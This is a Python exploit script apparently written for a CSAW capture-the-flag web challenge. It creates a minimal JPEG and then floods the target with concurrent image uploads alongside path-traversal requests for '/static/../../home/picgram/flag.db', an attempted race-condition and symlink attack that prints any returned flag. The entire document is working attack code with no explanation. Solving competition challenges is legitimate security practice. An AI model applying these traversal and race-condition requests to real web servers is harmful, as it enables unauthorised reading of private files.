import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def upload_file():
    files = {'image': ('test.jpg', open('test.jpg', 'rb'), 'image/jpeg')}
    try:
        r = requests.post('http://web.chal.csaw.io:5000', files=files)
        print(f"Upload response: {r.status_code}")
        if 'flag{' in r.text:
            print(f"Found flag: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

def symlink_attack():
    try:
        r = requests.get('http://web.chal.csaw.io:5000/static/../../home/picgram/flag.db')
        print(f"Symlink response: {r.status_code}")
        if 'flag{' in r.text:
            print(f"Found flag: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

# Create a valid test.jpg file
with open('test.jpg', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00')

# Run the race condition exploit
with ThreadPoolExecutor(max_workers=10) as executor:
    for _ in range(50):
        executor.submit(upload_file)
        executor.submit(symlink_attack)
